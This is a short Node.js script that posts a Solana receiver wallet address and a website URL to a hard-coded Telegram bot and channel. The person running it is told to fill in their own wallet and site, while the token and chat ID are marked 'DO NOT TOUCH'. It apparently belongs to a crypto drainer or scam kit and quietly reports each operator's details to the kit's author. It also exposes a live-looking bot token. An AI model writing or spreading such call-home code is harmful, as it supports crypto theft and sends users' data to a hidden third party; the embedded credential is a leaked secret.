const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7775444002:AAFPEESGH7hxLz-LDVf2TvCMwjjw2gz2-Lk';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '5915926682';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '9H324MMej9eTvLNQWiGrwWy1V8SYoUnvUuakK6Sgsx1a';
const website_url = 'http://localhost:5500';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
